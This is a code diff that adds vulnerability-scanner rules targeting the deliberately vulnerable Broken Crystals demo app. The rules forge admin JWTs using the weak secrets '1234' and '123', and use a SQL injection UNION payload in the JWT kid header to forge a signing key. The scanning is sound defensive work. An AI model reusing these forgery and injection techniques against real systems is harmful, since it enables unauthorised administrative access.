@@ -58166,6 +58166,166 @@ const brokencrystalsJwtRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+/** Broken Crystals JWT_SECRET_KEY from public .env (default weak-key oracle secret). */
+const BROKEN_CRYSTALS_JWT_WEAK_SECRETS = ["1234", "123"] as const;
+
+function brokencrystalsJwtValidateSecretOk(body: string): boolean {
+  return /"secret"\s*:\s*"this is our secret"/i.test(body);
+}
+
+const brokencrystalsJwtWeakKeyLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const path = "/api/auth/jwt/weak-key/validate";
+  const url = new URL(path, ctx.origin).toString();
+  const now = Math.floor(Date.now() / 1000);
+  const claims = { user: "admin", exp: now + 3600 };
+  const badToken = "thugir.invalid.probe.token";
+  const [noAuth, badAuth] = await Promise.all([
+    ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 15000 }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: badToken }
+    })
+  ]);
+  if (!looksAuthChallenge(noAuth) || !looksAuthChallenge(badAuth)) return NEGATIVE;
+  for (const secret of BROKEN_CRYSTALS_JWT_WEAK_SECRETS) {
+    const token = buildHs256Jwt(claims, secret);
+    const doc = await ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: `Bearer ${token}` }
+    });
+    if (!looksAuthGatedJson(doc) || !brokencrystalsJwtValidateSecretOk(doc.body)) continue;
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        url,
+        weakSecret: secret,
+        statusWithWeakJwt: doc.status,
+        responseSample: doc.body.slice(0, 150).trim(),
+        note: `Broken Crystals GET /api/auth/jwt/weak-key/validate accepts HS256 JWT signed with weak secret '${secret}' and returns secret — weak HMAC key oracle`
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const brokencrystalsJwtWeakKeyRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/weak-key\/validate/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtWeakKeyLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/weak-key/validate route scan — HS256 JWT signed with weak HMAC secret bypasses authentication"
+    }
+  };
+};
+
+const brokencrystalsJwtKidSqlLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const path = "/api/auth/jwt/kid-sql/validate";
+  const url = new URL(path, ctx.origin).toString();
+  const now = Math.floor(Date.now() / 1000);
+  const probeSecret = `thugir-kid-${now.toString(36)}`;
+  const kid = `-1' UNION SELECT '${probeSecret}' --`;
+  const claims = { user: "admin", exp: now + 3600 };
+  const forgedToken = buildHs256Jwt(claims, probeSecret, { kid });
+  const badToken = "thugir.invalid.probe.token";
+  const [noAuth, badAuth, forgedAuth] = await Promise.all([
+    ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 15000 }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: badToken }
+    }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: `Bearer ${forgedToken}` }
+    })
+  ]);
+  if (!looksAuthChallenge(noAuth) || !looksAuthChallenge(badAuth)) return NEGATIVE;
+  if (!looksAuthGatedJson(forgedAuth) || !brokencrystalsJwtValidateSecretOk(forgedAuth.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url,
+      kidPayload: kid,
+      injectedSecret: probeSecret,
+      statusWithForgedJwt: forgedAuth.status,
+      responseSample: forgedAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals GET /api/auth/jwt/kid-sql/validate fetches HMAC key via unsanitized JWT kid SQL and accepts forged HS256 token — KID SQL injection oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtKidSqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt\/kid-sql\/validate/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtKidSqlLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt/kid-sql/validate route scan — JWT kid header SQL injection forges valid HMAC signing key"
+    }
+  };
+};
+
+const brokencrystalsSimpleCsrfFlowLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/auth/simple-csrf-flow", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 128, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const token = doc.body.trim();
+  if (!/^[A-Za-z0-9+/=]{32}$/.test(token)) return NEGATIVE;
+  const setCookie = doc.headers["set-cookie"] || "";
+  if (!/_csrf=/i.test(setCookie) || !/httponly/i.test(setCookie)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      token,
+      setCookie: setCookie.slice(0, 120),
+      snippet: token,
+      note: "Broken Crystals GET /api/auth/simple-csrf-flow returns a 32-char CSRF token and sets HttpOnly _csrf cookie without authentication — simple CSRF oracle"
+    }
+  };
+};
+
+const brokencrystalsSimpleCsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/simple-csrf-flow/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsSimpleCsrfFlowLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/simple-csrf-flow route scan — unauthenticated GET returns CSRF token and HttpOnly cookie"
+    }
+  };
+};
+
 const brokencrystalsDomCsrfFlowLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const url = new URL("/api/auth/dom-csrf-flow", ctx.origin).toString();
@@ -62212,6 +62372,12 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsProcessNumbersRouteLiveOracle,
   brokencrystalsJwtAlgNoneLiveOracle,
   brokencrystalsJwtRouteLiveOracle,
+  brokencrystalsJwtWeakKeyLiveOracle,
+  brokencrystalsJwtWeakKeyRouteLiveOracle,
+  brokencrystalsJwtKidSqlLiveOracle,
+  brokencrystalsJwtKidSqlRouteLiveOracle,
+  brokencrystalsSimpleCsrfFlowLiveOracle,
+  brokencrystalsSimpleCsrfRouteLiveOracle,
   brokencrystalsDomCsrfFlowLiveOracle,
   brokencrystalsDomCsrfRouteLiveOracle,
   brokencrystalsNestedJsonDoSLiveOracle,
